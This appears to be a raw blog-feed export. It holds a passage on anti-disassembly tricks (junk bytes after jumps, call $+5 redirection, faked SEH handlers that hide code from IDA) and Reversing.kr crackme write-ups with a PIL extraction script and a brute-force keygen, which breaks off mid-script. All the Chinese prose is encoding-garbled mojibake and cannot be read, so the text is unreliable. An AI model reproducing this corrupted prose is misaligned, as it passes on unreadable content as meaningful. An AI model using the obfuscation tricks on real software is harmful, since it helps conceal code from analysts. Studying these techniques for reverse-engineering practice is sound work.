<p>çº¿æ€§æ‰«æç±»å‹çš„åæ±‡ç¼–å™¨ä¼šè¯•å›¾è§£æä¸€ä¸ªç¨‹åºä»£ç æ®µçš„æ‰€æœ‰æœºå™¨ç ï¼Œä¸€æ¡æŒ‡ä»¤çš„å¼€å§‹é€šå¸¸æ˜¯ä¸Šä¸€æ¡æŒ‡ä»¤çš„ç»“å°¾ï¼Œå¹¶ä¸”ä¸ä¼šåŒºåˆ†æŒ‡ä»¤ç±»å‹ï¼Œæ‰€ä»¥ï¼Œå¦‚æœåœ¨è¿™äº›æ­£å¸¸çš„æŒ‡ä»¤ä¹‹é—´æ’å…¥ä¸€äº›åƒåœ¾ä»£ç (æ¯”å¦‚ä¸€ä¸ªå­—ç¬¦ä¸²)ï¼Œå°±å¯èƒ½ä¼šæ‰“ä¹±çº¿æ€§æ‰«æåæ±‡ç¼–å™¨çš„æ•´ä¸ªåæ±‡ç¼–æµç¨‹ï¼Œå¯¼è‡´åç»­ä»£ç å…¨éƒ¨é”™è¯¯ã€‚<br>ä¾‹å¦‚ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler5.png"
                      alt="image"
                ><br>æµ…è“è‰²çš„éƒ¨åˆ†å®é™…ä¸Šæ˜¯æ’å…¥çš„å­—ç¬¦ä¸²ï¼Œå®ƒä»¬æœ¬ä¸åº”è¯¥è¢«è§£ææˆæŒ‡ä»¤ï¼Œä½†æ˜¯çº¿æ€§æ‰«æåæ±‡ç¼–å™¨åœ¨è§£æå®Œä¸Šä¸€æ¡æŒ‡ä»¤ä¹‹åï¼Œä¼šè®¤ä¸ºè¿™é‡Œä¹Ÿæ˜¯æ­£å¸¸çš„æŒ‡ä»¤(åœ¨ä»£ç æ®µ)ï¼Œå¼ºè¡Œè§£æå¯¼è‡´åç»­çš„ä»£ç éƒ½ä¼šè§£æå¤±è´¥(è¿™ä¸€ç±»åæ±‡ç¼–å™¨çš„ä»£è¡¨ï¼šwinDBG)ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler6.png"
                      alt="image"
                ></p>
<p>å…³äºé€’å½’ä¸‹é™åæ±‡ç¼–å™¨ï¼Œå®ƒå’Œçº¿æ€§æ‰«æå‹åæ±‡ç¼–å™¨æœ€å¤§çš„åŒºåˆ«å°±æ˜¯å®ƒåœ¨è§£æåˆ°æŸä¸€æ¡æ›´æ”¹äº†æ§åˆ¶æµçš„æŒ‡ä»¤æ—¶(å¦‚ jmpã€callã€retç­‰)ï¼Œä¼šå°è¯•è·å–åˆ°è·³è½¬çš„ç›®çš„åœ°å€ï¼Œå¹¶ä¸”è½¬å‘ç›®çš„åœ°å€ç»§ç»­è§£æä»£ç ï¼Œè€Œä¸æ˜¯ç›´æ¥å‘åè§£æã€‚<br>ç„¶è€Œå®ƒä¹Ÿä¸æ˜¯å®Œç¾çš„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ§åˆ¶æµæ›´æ”¹çš„ç›®çš„åœ°ä¸æ˜¯ç¡®å®šçš„ï¼Œè€Œæ˜¯åŠ¨æ€è®¡ç®—å‡ºæ¥(æ¯”å¦‚ <strong>call eax</strong> è¿™æ ·)ï¼Œé‚£ä¹ˆåæ±‡ç¼–å™¨ä¹Ÿä¸èƒ½ç¡®å®šç›®çš„åœ°å€ï¼Œé€ æˆçš„ä¸€ä¸ªåæœå°±æ˜¯ï¼Œç¨‹åºä¸­æŸäº›ä»£ç ä¸€ç›´ä¹Ÿæ²¡æœ‰è¢«è°ƒç”¨(æˆ–è·³è½¬åˆ°)ï¼Œé‚£ä¹ˆè¿™éƒ¨åˆ†ä»£ç å°±å¯èƒ½æ°¸è¿œä¹Ÿä¸ä¼šè¢«è§£æ(è¿™ç±»åæ±‡ç¼–å™¨çš„ä»£è¡¨æ˜¯ IDA å’Œ OD)ã€‚</p>
<p>æ¥ä¸‹æ¥ç»§ç»­åˆ†æä¸€ä¸‹ååç¼–è¯‘çš„æŠ€æœ¯(ä¸€äº›æ‰‹æ®µåœ¨çœ‹é›ªçš„æ–‡ç« ä¸­å·²ç»å­˜åœ¨è¯¦ç»†çš„åˆ†æï¼Œè¿™é‡Œæ‹¿å‡ ä¸ªç¨åŠ åˆ†æ)ï¼š</p>
<p><strong>åƒåœ¾ä»£ç </strong><br>PDF ä¸­æ¯”è¾ƒç®€å•çš„ä¸€ä¸ªååç¼–è¯‘ç­–ç•¥ï¼Œä¹Ÿæ¯”è¾ƒæœ‰æ„æ€ã€‚ Â <br>ç®€å•çš„äº†è§£äº†åæ±‡ç¼–å™¨çš„å¤§è‡´å·¥ä½œåŸç†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç€æ‰‹ç ´åå®ƒçš„å·¥ä½œæµç¨‹ï¼Œä¸€ä¸ªç®€å•çš„æ–¹æ³•å°±æ˜¯åœ¨æ­£å¸¸çš„ä»£ç ä¸­å¤¹æ‚åƒåœ¾ä»£ç ï¼Œè¿™äº›åƒåœ¾ä»£ç å¯ä»¥æ˜¯çœŸå®çš„æŒ‡ä»¤ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€äº›å­—ç¬¦ä¸²ï¼Œæ€»ä¹‹ï¼Œå®ƒä»¬æœ¬ä¸åº”è¯¥å‡ºç°åœ¨æ­£å¸¸çš„ä»£ç ä¸­ã€‚<br>æ’å…¥çš„åƒåœ¾ä»£ç çš„ä¸€èˆ¬ç»“æ„å¯èƒ½æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp lable</span><br><span class="line"> db junk code</span><br><span class="line">lable:</span><br><span class="line"> normal code</span><br></pre></td></tr></table></figure></div>
<p>jmp æŒ‡ä»¤æ˜¯ä¸€å®šä¼šè¢«æ‰§è¡Œçš„ï¼Œæ‰€ä»¥å†…éƒ¨çš„ junk code ä¸ä¼šè¢«æ‰§è¡Œï¼Œä½†æ˜¯å®ƒä»¬è¿˜æ˜¯ä¼šå¯¹åæ±‡ç¼–å™¨é€ æˆå½±å“ï¼Œä¾‹å¦‚ç¬¬ä¸€ç§æ–¹å¼æåˆ°çš„ç ´å IDA çš„æ ˆï¼Œä½¿å…¶ä¸å¹³è¡¡ã€‚<br>ä½†æ˜¯é‚£ç§æ–¹æ³•æ¯”è¾ƒç®€å•ï¼Œå®¹æ˜“è¢«å‘ç°ï¼Œè¿™é‡Œä¼šé‡‡å–ä¸€ä¸ªæ›´åŠ éšç§˜çš„æ–¹æ³•ï¼Œå°†æ­£å¸¸çš„ä»£ç æ’å…¥åˆ°åƒåœ¾ä»£ç ä¸­ï¼Œå¹¶æ›´æ”¹æ‰§è¡Œæµåˆ°åƒåœ¾ä»£ç ã€‚<br>è§‚å¯Ÿä»¥ä¸‹ä»£ç ç‰‡æ®µï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">call $+5</span><br><span class="line">pop eax</span><br><span class="line">add eax 10h</span><br><span class="line">call eax</span><br><span class="line">inc esi</span><br><span class="line">popad </span><br><span class="line">outsb </span><br><span class="line">je Label1</span><br><span class="line">jnc Label2</span><br><span class="line">imul esp,[ebx+21h],001337D8h</span><br><span class="line">add byte ptr [eax],al</span><br><span class="line">dd 2 dup(0)</span><br><span class="line">db 0</span><br></pre></td></tr></table></figure></div>
<p>æœ‰å‡ å¥ä»£ç éå¸¸è¯¡å¼‚ï¼Œä¸åƒæ˜¯æ­£å¸¸ç¨‹åºåº”è¯¥æœ‰çš„ï¼Œè€Œä¸”æœ‰ä¸€æ¡å¥‡æ€ªçš„æŒ‡ä»¤ï¼š call $+5 ï¼Œå…¶å®å®ƒçš„æ„æ€å°±æ˜¯è°ƒç”¨ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œé‚£ä¹ˆè¿™é‡Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</p>
<ol>
<li>call $+5ï¼Œå°† call æŒ‡ä»¤åˆ†è§£ï¼Œå°±æ˜¯ push ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œç„¶å jmp åˆ°ç›®çš„åœ°å€ç»§ç»­è¿è¡Œï¼Œè€Œè¿™é‡Œçš„ç›®çš„åœ°å€å°±æ˜¯ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</li>
<li>è¿è¡Œåˆ° pop eaxï¼Œå°†ä¹‹å‰å‹å…¥æ ˆä¸­çš„åœ°å€(å°±æ˜¯è¿™æ¡æŒ‡ä»¤çš„åœ°å€)å¼¹å‡ºç»™ eaxã€‚</li>
<li>add eax,10h ï¼Œå°† eax ä¸­çš„å€¼åŠ ä¸Š 0x10ã€‚</li>
<li>call eaxï¼Œè°ƒç”¨ç»è¿‡ä¸Šé¢å¤„ç†çš„åœ°å€ã€‚</li>
</ol>
<p>åœ¨ IDA ä¸­å¯ä»¥çœ‹åˆ°è¿™æ ·çš„ä»£ç ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler7.png"
                      alt="image"
                ></p>
<p>ç»è¿‡è®¡ç®—å¯ä»¥çŸ¥é“ï¼Œæœ€åçš„ call eax å®é™…ä¼šæ‰§è¡Œåœ°å€ä¸º 0x401032 ï¼Œä½†æ˜¯ç›®çš„åœ°å€é™„è¿‘çš„ä»£ç å¹¶æ²¡æœ‰åœ¨ IDA ä¸­ä½“ç°å‡ºæ¥ï¼Œå…¶å®çœŸå®çš„ä»£ç è¢«å¤¹æ‚åœ¨ junk code ä¸­äº†ï¼Œåœ¨åƒåœ¾ä»£ç ä¸ŠæŒ‰ä¸‹ U é”®ï¼Œç„¶ååœ¨æ­£ç¡®çš„åœ°å€æŒ‰ä¸‹ C é”®ï¼Œå°±èƒ½å¾—å‡ºæ­£å¸¸ä»£ç ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler8.png"
                      alt="image"
                ></p>
<p><strong>ä¼ªé€ SEH</strong></p>
<p>å¦ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„ååç¼–è¯‘æ–¹å¼åœ¨ PDF ä¸­ç»™å‡ºï¼Œé‚£å°±æ˜¯ä¼ªé€ ä¸€ä¸ª(æˆ–è€…è¯´æ˜¯ä¿®æ”¹ç°æœ‰çš„)SEHï¼Œä»€ä¹ˆæ˜¯ SEH? Â <br>SEH å…¨ç§°ï¼šç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼Œæ˜¯ Windows æ“ä½œç³»ç»Ÿä¸Šçš„ä¸€ç§å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œå½“ç¨‹åºå‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œå°±ä¼šç”¨åˆ°è¿™ä¸ªä¸œè¥¿ï¼Œå®ƒæ˜¯ç”±ä¸€äº›ç»“æ„ä½“(EXCEPTION_REGISTRATION)ä¸²æ¥è€Œæˆçš„å•å‘é“¾è¡¨ï¼Œæ¯ä¸ªç»“æ„ä½“å†…éƒ½æœ‰ä¸¤ä¸ªä¸»è¦å­—æ®µ:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_EXCEPTION_REGISTRATION struc</span><br><span class="line"></span><br><span class="line">prev     dd ?</span><br><span class="line"></span><br><span class="line">handler dd ?</span><br><span class="line"></span><br><span class="line">_EXCEPTION_REGISTRATION   ends</span><br></pre></td></tr></table></figure></div>

<p>prev è¡¨ç¤ºä¸‹ä¸€ä¸ªç»“æ„ä½“çš„åœ°å€ï¼Œè€Œ handler å°±æ˜¯å¤„ç†å¼‚å¸¸çš„å‡½æ•°ã€‚<br>äº†è§£äº†ä»€ä¹ˆæ˜¯ SEH ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä»£ç ç‰‡æ®µï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler9.png"
                      alt="image"
                ></p>
<p>ä¹ä¸€çœ‹æ²¡æœ‰ä»€ä¹ˆå¼‚å¸¸ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€æ¡å¥‡æ€ªçš„æŒ‡ä»¤(å›¾ä¸­çº¢æ¡†), mov large fs:0,esp ï¼Œå¯ä»¥ç®€åŒ–ä¸º mov fs[0],esp<br>å°† ESP å³å½“å‰æ ˆé¡¶èµ‹å€¼ç»™ fs æ®µçš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå…¶å®è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„æ“ä½œï¼šå®‰è£… SEH ï¼Œè¿™å¥ä»£ç çš„å«ä¹‰å°±æ˜¯æŠŠæ­£å¸¸çš„ SEH é“¾è¡¨çš„ç¬¬ä¸€ä¸ªç»“æ„ä½“çš„åœ°å€è¿ç§»åˆ°äº†æ ˆä¸Šï¼Œå³åœ¨ ESP å¼€å§‹çš„æ ˆç©ºé—´å­˜åœ¨äº†ä¸€ä¸ª EXCEPTION_REGISTRATION ç»“æ„ä½“ï¼Œç»“åˆä»£ç å‰é¢çš„ push æ“ä½œï¼Œå°±å¯ä»¥çŸ¥é“ï¼Œå¼€å‘è€…åœ¨æ ˆä¸Šåˆ¶ä½œäº†ä¸€ä¸ª EXCEPTION_REGISTRATION ç»“æ„ï¼Œä¿®æ”¹äº†æ­£å¸¸çš„ handler çš„å€¼(æ„Ÿè§‰æœ‰äº›åƒ PWN OvO)ï¼Œæ³¨æ„åœ¨ 0x40118E è¿™å¥ä»£ç ï¼Œå¯ä»¥è½¬åŒ–ä¸º mov dword ptr [0], 0 ï¼Œå‘ä¸€ä¸ªä¸å­˜åœ¨çš„åœ°å€èµ‹å€¼ï¼Œä¸€å®šä¼šè§¦å‘å¼‚å¸¸ï¼Œä»è€Œè°ƒç”¨åˆ°äº†å¼€å‘è€…è‡ªå·±åˆ¶ä½œçš„ SEHã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler10.png"
                      alt="image"
                ></p>
<p>é€šè¿‡è®¡ç®—å‡ºè¿™ä¸ªå¼‚å¸¸å¤„ç†å‡½æ•°çš„åœ°å€ï¼Œæˆ‘ä»¬å°±èƒ½æ‰¾åˆ°çœŸæ­£æ­£ç¡®çš„ä»£ç ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/dedecompiler11.png"
                      alt="image"
                ></p>
<h2 id="æ€»ç»“ä¸€ä¸‹"><a href="#æ€»ç»“ä¸€ä¸‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a>æ€»ç»“ä¸€ä¸‹</h2><p>çœ‹äº†çœ‹é›ªçš„è¿™ç¯‡æ–‡ç« ï¼Œç®€å•è¿›è¡Œå°æ€»ç»“ï¼Œäº†è§£åˆ°å‡ ç§å¾ˆç»å…¸çš„ååç¼–è¯‘æ–¹æ³•ï¼Œå…¶ä¸­æœ‰å‡ ä¸ªéå¸¸å·§å¦™ï¼ŒåŒ…æ‹¬éšè—çœŸå®ä»£ç åˆ°åƒåœ¾ä»£ç ï¼Œä¿®æ”¹è¿”å›åœ°å€ï¼Œæ³¨å†Œå‡çš„ SEH ç­‰ç­‰ï¼Œååç¼–è¯‘è¿˜æœ‰æ›´å¤šçš„æ–¹æ³•ï¼Œè™½ç„¶æ‰‹æ³•å¤šç§å¤šæ ·ï¼Œä½†æ˜¯æœ€é‡è¦çš„æ˜¯æ¬ºéª—åç¼–è¯‘å™¨ï¼Œéšè—ç¨‹åºçš„å®é™…æµç¨‹ï¼Œä¸è¿‡å†å¼ºçš„èŠ±æŒ‡ä»¤ä¹Ÿæ˜¯å¯ä»¥è¢«æ¸…é™¤çš„ï¼Œæ‰€ä»¥é€šå¸¸å¯ä»¥é…åˆè½¯ä»¶åŠ å£³ï¼Œä»£ç æ··æ·†ç­‰æŠ€æœ¯ï¼Œå¢å¤§é€†å‘éš¾åº¦ã€‚</p>
<p>è¯†åˆ«èŠ±æŒ‡ä»¤çš„åŠæ³•ï¼šå½“çœ‹åˆ°æŸäº›æŒ‡ä»¤æ˜¯ä¸å¸¸è§çš„ï¼Œæˆ–è€…ä¸€äº›æŒ‡ä»¤åºåˆ—æ¯«æ— é€»è¾‘å¯è¨€ï¼Œé‚£ä¹ˆå°±è¦å°å¿ƒäº†ï¼Œå› ä¸ºè¿™é‡Œå¯èƒ½å°±æ˜¯ä¸€æ®µèŠ±æŒ‡ä»¤ï¼Œå¦‚æœæ²¡æœ‰æ˜æ˜¾çš„èŠ±æŒ‡ä»¤å‡ºç°ï¼Œé‚£ä¹ˆå°±è¦å…³æ³¨ç‰¹æ®Šçš„æŒ‡ä»¤åºåˆ—ï¼ŒåŒ…æ‹¬è‡ªè¡Œæ³¨å†Œ SEH ï¼Œä¿®æ”¹ç¨‹åºçš„è¿”å›åœ°å€ç­‰ç­‰ï¼Œå…¶å®èŠ±æŒ‡ä»¤åšåˆ°çš„åªæ˜¯åé™æ€åˆ†æï¼Œå¯¹äºç»éªŒè€åˆ°çš„é€†å‘å·¥ä½œè€…æ¥è¯´ï¼ŒåŠ¨æ€è°ƒè¯•é€šå¸¸æ˜¯ç ´è§£è¿™äº›èŠ±æŒ‡ä»¤çš„å¥½åŠæ³•ã€‚</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Reversing.kr 6-9</title>
    <url>/2018/09/08/reversingkr6-9/</url>
    <content><![CDATA[<p>Reversing.kr ä¸Šé¢çš„é¢˜ç›®ã€‚</p>
<span id="more"></span>

<h2 id="06-ImagePrc"><a href="#06-ImagePrc" class="headerlink" title="06 ImagePrc"></a>06 ImagePrc</h2><p>æ‰“å¼€ç¨‹åºï¼Œé‡Œé¢æœ‰ä¸€ä¸ª check æŒ‰é’®ï¼Œä½†æ˜¯æ²¡æœ‰æ–‡æœ¬æ¡†ç­‰å¸¸è§„å…ƒç´ ï¼Œç›´æ¥ç‚¹å‡»æŒ‰é’®ä¼šå¼¹çª—æŠ¥é”™ï¼Œåœ¨å¶ç„¶çš„æ“ä½œä¸­å‘ç°ï¼Œå¯ä»¥æŒ‰ä½é¼ æ ‡å·¦é”®åœ¨çª—å£ä¸­ç”»ç”»ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-1.png"
                      alt="image"
                ></p>
<p>æ‰“å¼€IDAåŠ è½½æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥å°† WinMain å‡½æ•°åç¼–è¯‘ï¼Œä¼šçœ‹åˆ°å¾ˆå¤šçš„ç³»ç»Ÿå‡½æ•°ï¼Œåœ¨ç¬¬ 16 è¡Œå¯ä»¥çœ‹åˆ°å¦å¤–ä¸€ä¸ªå‡½æ•°ï¼ŒåŒå‡»è¿›å…¥ï¼Œå‘ç°æœ‰æ›´å¤šçš„ç³»ç»Ÿå‡½æ•°ï¼Œä¾æ¬¡ä¸Šç½‘æŸ¥é˜…ä¼šå‘ç°ï¼Œå®ƒä»¬å¤§å¤šæ•°ä¸ç»˜å›¾æœ‰å…³ï¼Œä»¥ç¨‹åºçš„çª—å£ä¸ºç”»å¸ƒå»ç»˜åˆ¶ä¸€äº›å›¾å½¢ï¼Œåœ¨å‡½æ•°çš„ä¸‹æ–¹å¯ä»¥æ‰¾åˆ°ä¸€å¤„åˆ¤æ–­ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-3.png"
                      alt="image"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-2.png"
                      alt="image"
                ></p>
<p>å¤§è‡´è§‚å¯Ÿå‘ç°ï¼Œä¸Šæ–¹è°ƒç”¨äº†å‡ ä¸ª API åŠ è½½äº†ä¸€å¼ å›¾ç‰‡ï¼Œç„¶åè¿›å…¥ä¸€ä¸ª while å¾ªç¯ï¼Œä¸éš¾çŒœæµ‹ï¼Œè¿™ä¸ª while å¾ªç¯èƒ½å¤Ÿç»§ç»­è¿›è¡Œçš„æ¡ä»¶åº”è¯¥å°±æ˜¯ä¸¤å¼ å›¾ç‰‡(æˆ‘ä»¬ç»˜åˆ¶çš„å’Œç¨‹åºåŠ è½½çš„)çš„åƒç´ å®Œå…¨å»åˆï¼Œå…¶ä¸­å˜é‡ v12 æ‰€è®°å½•çš„åº”è¯¥å°±æ˜¯åŒ¹é…çš„åƒç´ æ•°é‡ï¼Œå¦‚æœå¤§äº 90000 ä¸ªï¼Œåˆ™ä¸ä¼šæŠ¥é”™ã€‚<br>ç”±äºæˆ‘ä»¬æ˜¯ä½¿ç”¨é¼ æ ‡ç»˜åˆ¶ï¼Œç”±äºé¼ æ ‡ä¸å¯ç²¾ç¡®æ§åˆ¶ï¼Œæ‰€ä»¥é€šè¿‡æ­£å¸¸æ¸ é“å¾—åˆ° flag åº”è¯¥æ˜¯ä¸å¯èƒ½çš„ï¼Œéœ€è¦ç›´æ¥æŠ½å– EXE ä¸­çš„å›¾ç‰‡èµ„æºï¼Œè¿™é‡Œç”¨åˆ°ä¸€ä¸ªå·¥å…· eXescope ï¼Œå°†ç¨‹åºåœ¨ eXescope ä¸­æ‰“å¼€ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-4.png"
                      alt="image"
                ></p>
<p>åœ¨èµ„æºç±»ä¸‹èƒ½å¤Ÿå‘ç°åä¸º 101 çš„èµ„æºï¼Œå¤§è‡´æµè§ˆä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œåªæœ‰ 0xff å’Œ 0x00 è¿™ä¸¤ç§å­—èŠ‚ï¼Œè€Œä¸”å®ƒçš„å¤§å°ä¸º 0x15F90 å³ 90000 ä¸ªå­—èŠ‚ï¼Œå’Œç¨‹åºä¸­å¯¹æ¯”çš„åƒç´ æ•°ä¸€è‡´ï¼ŒçŒœæµ‹è¿™ä¸ªæ–‡ä»¶å°±æ˜¯å›¾ç‰‡æ–‡ä»¶ï¼Œå°†å®ƒå¯¼å‡ºï¼Œç”±äºå›¾ç‰‡åªæœ‰é»‘ç™½ä¸¤ç§é¢œè‰²ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ 3 ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œæ„æˆ (R,G,B) çš„å½¢å¼ï¼Œè€Œä¸”å›¾åƒçš„é«˜åº¦å’Œå®½åº¦ä¹Ÿæ˜¯å¯ä»¥æ‰¾åˆ°çš„ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-5.png"
                      alt="image"
                ></p>
<p>ä¸ºäº†æ–¹ä¾¿ï¼Œç›´æ¥ä½¿ç”¨ python çš„ PIL åº“å¤„ç†è¿™ä¸ªæ–‡ä»¶ï¼Œç¼–å†™ä»¥ä¸‹è„šæœ¬ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">width = 200</span><br><span class="line">height = 150</span><br><span class="line"></span><br><span class="line">fp = open(&#x27;101&#x27;, &#x27;rb&#x27;)</span><br><span class="line">data = fp.read()</span><br><span class="line">im = Image.frombytes(&#x27;RGB&#x27;, (width, height), data)</span><br><span class="line">im = im.transpose(Image.FLIP_TOP_BOTTOM)</span><br><span class="line">im.show()</span><br><span class="line">im.save(&#x27;flag.bmp&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°å›¾åƒå¦‚ä¸‹ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr6-6.png"
                      alt="image"
                ></p>
<p>flagï¼š <strong>GOT</strong></p>
<h2 id="07-Position"><a href="#07-Position" class="headerlink" title="07 Position"></a>07 Position</h2><p>ç¼–å†™æ³¨å†Œæœºçš„é¢˜ç›®ï¼Œé˜…è¯»è¯´æ˜ï¼Œè¦æ±‚æˆ‘ä»¬æ‰¾åˆ°åºåˆ—å·ä¸º â€œ76876-77776â€ çš„ç”¨æˆ·åï¼Œå¹¶ä¸”æç¤ºå¯èƒ½å­˜åœ¨å¤šè§£ï¼Œåªéœ€è¦æ‰¾åˆ°æœ€åä¸€ä½æ˜¯ p çš„ç”¨æˆ·åã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-1.png"
                      alt="image"
                ></p>
<p>MFC çš„ç¨‹åºä¸€èˆ¬æ¯”è¾ƒæ··ä¹±ï¼Œç”¨ IDA æ‰“å¼€å¯è§ä¸€æ–‘ï¼Œæœç´¢å­—ç¬¦ä¸²å¯ä»¥æ‰¾åˆ°å…³é”®å‡½æ•°ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-2.png"
                      alt="image"
                ></p>
<p>è¿›å…¥ <strong>check</strong> å‡½æ•°ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-3.png"
                      alt="image"
                ></p>
<p>ç³»ç»Ÿæ‰€æä¾›çš„å‡½æ•°éƒ½éå¸¸éš¾çœ‹ï¼Œä½†æ˜¯é™¤æ­¤ä¹‹å¤–é€»è¾‘æ¯”è¾ƒæ¸…æ™°ï¼Œé€šè¿‡æŸ¥æ‰¾å„ä¸ª API çš„ç”¨é€”å¯ä»¥æ•´ç†å‡ºç¨‹åºé€»è¾‘ï¼Œå…¶ä¸­å…³é”®ç®—æ³•åœ¨è¿™é‡Œï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr7-4.png"
                      alt="image"
                ></p>
<p>ç›¸åŒçš„ç®—æ³•æœ‰ä¸¤å¤„ï¼Œæ¯æ¬¡éƒ½å–è¾“å…¥çš„ç”¨æˆ·åä¸­çš„ 2 ä½ï¼Œæ•…å¯ä»¥çŸ¥é“ç”¨æˆ·åçš„é•¿åº¦ä¸º 4 ä¸ªå­—èŠ‚ï¼Œè€Œä¸”è®¡ç®—è¿‡ç¨‹ä¹Ÿæ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå°†å–å¾—çš„ä¸¤ä¸ªå­—èŠ‚åˆ†åˆ«è®¡ç®—å‡º 5 ä¸ªæ–°çš„æ•°å­—ï¼Œç„¶åå¸¦å…¥æ¯”è¾ƒï¼ŒæŒ‰ä¸€å®šé¡ºåºç»„åˆè®¡ç®—å¾—åˆ°çš„ 10 ä¸ªæ•°å­—ï¼Œç„¶åå’Œè¾“å…¥çš„æ³¨å†Œç è¿›è¡Œæ¯”è¾ƒï¼Œç¬¬äºŒå¤„ä»£ç ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç¼–å†™æ³¨å†Œæœºæ—¶ï¼Œå¯ä»¥ç›´æ¥å°†è¿™é‡Œçš„ä¼ªä»£ç æ¬ä¸‹æ¥ï¼Œç¨åŠ ä¿®æ”¹å³å¯ï¼Œä½†æ˜¯é¢˜ç›®è¦æ±‚æ‰¾åˆ°æ³¨å†Œç å¯¹åº”çš„ç”¨æˆ·åï¼Œç›´æ¥çˆ†ç ´ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># python 2.7</span><br><span class="line">#name = raw_input(&quot;Please input a name:&quot;)</span><br><span class="line">name = []</span><br><span class="line">for a in range(97,123):</span><br><span class="line">    for b in range(97,123):</span><br><span class="line">        for c in range(97,123):</span><br><span class="line">            for d in range(97,123):</span><br><span class="line">                name.append(a)</span><br><span class="line">                name.append(b)</span><br><span class="line">                name.append(c)</span><br><span class="line">                name.append(d)</span><br><span class="line">                serial = &quot;&quot;</span><br><span class="line">                if len(name) != 4:</span><br><span class="line">                    print(&quot;Wrong length!!&quot;)</span><br><span class="line">                else:</span><br><span class="line">                    v6 = name[0]</span><br><span class="line">                    v8 = name[1]</span><br><span class="line">                    v7 = (v6 &amp; 1) + 5</span><br><span class="line">                    v48 = ((v6 &gt;&gt; 4) &amp; 1) + 5</span><br><span class="line">                    v42 = ((v6 &gt;&gt; 1) &amp; 1) + 5</span><br><span class="line">                    v44 = ((v6 &gt;&gt; 2) &amp; 1) + 5</span><br><span class="line">                    v46 = ((v6 &gt;&gt; 3) &amp; 1) + 5</span><br><span class="line">                    v34 = (v8 &amp; 1) + 1;</span><br><span class="line">                    v40 = ((v8 &gt;&gt; 4) &amp; 1) + 1</span><br><span class="line">                    v36 = ((v8 &gt;&gt; 1) &amp; 1) + 1</span><br><span class="line">                    v9 = ((v8 &gt;&gt; 2) &amp; 1) + 1</span><br><span class="line">                    v38 = ((v8 &gt;&gt; 3) &amp; 1) + 1</span><br><span class="line">                    serial += str(v7 + v9)</span><br><span class="line">                    serial += str(v46 + v38)</span><br><span class="line">                    serial += str(v42 + v40)</span><br><span class="line">                    serial += str(v44 + v34)</span><br><span class="line">                    serial += str(v48 + v36)</span><br><span class="line">                    serial += &#x27;-&#x27;</span><br><span class="line">                    v20 = name[2]</span><br><span class="line">                    v22 = name[3]</span><br><span class="line">                    v21 = (v20 &amp; 1) + 5</span><br><span class="line">                    v49 = ((v20 &gt;&gt; 4) &amp; 1) + 5</span><br><span class="line">                    v43 = ((v20 &gt;&gt; 1) &amp; 1) + 5</span><br><span class="line">                    v45 = ((v20 &gt;&gt; 2) &amp; 1) + 5</span><br><span class="line">                    v47 = ((v20 &gt;&gt; 3) &amp; 1) + 5</span><br><span class="line">                    v35 = (v22 &amp; 1) + 1</span><br><span class="line">            